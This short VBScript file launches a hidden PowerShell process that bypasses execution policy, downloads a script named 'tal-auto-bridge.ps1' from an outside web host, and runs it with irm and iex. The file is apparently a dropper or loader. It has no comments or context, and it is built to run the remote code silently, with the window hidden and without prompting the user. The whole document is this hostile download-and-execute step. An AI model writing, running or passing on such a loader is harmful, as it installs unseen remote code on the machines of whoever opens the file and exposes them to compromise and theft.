Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""irm https://www.shippingwish.com/tal-auto-bridge.ps1 | iex""", 0, False
